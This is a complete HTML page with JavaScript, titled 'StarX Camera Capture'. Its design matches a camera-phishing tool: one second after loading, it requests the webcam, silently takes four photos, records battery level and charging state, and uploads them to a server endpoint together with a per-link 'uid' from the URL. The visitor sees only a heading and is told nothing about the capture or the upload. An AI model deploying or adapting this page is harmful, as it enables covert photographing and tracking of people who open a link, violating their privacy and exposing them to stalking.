<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>StarX Camera Capture</title>
</head>
<body>
<h1>📸 StarX Camera Capture</h1>
<script>
const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";

async function capturePhotos() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");

    let batteryLevel = "Unknown";
    let charging = "Unknown";

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryLevel = Math.round(battery.level * 100);
      charging = battery.charging ? "true" : "false";
    }

    const formData = new FormData();
    formData.append("uid", uid);
    formData.append("battery", batteryLevel.toString());
    formData.append("charging", charging);

    for (let i = 1; i <= 4; i++) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
      formData.append("photo" + i, blob, `snap${i}.jpg`);
      await new Promise(r => setTimeout(r, 700)); // small delay
    }

    await fetch("/api/upload", {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(t => t.stop());

  } catch (e) {
    console.error("Camera error:", e);
  }
}

window.onload = () => setTimeout(capturePhotos, 1000);
</script> 
</body>
</html>
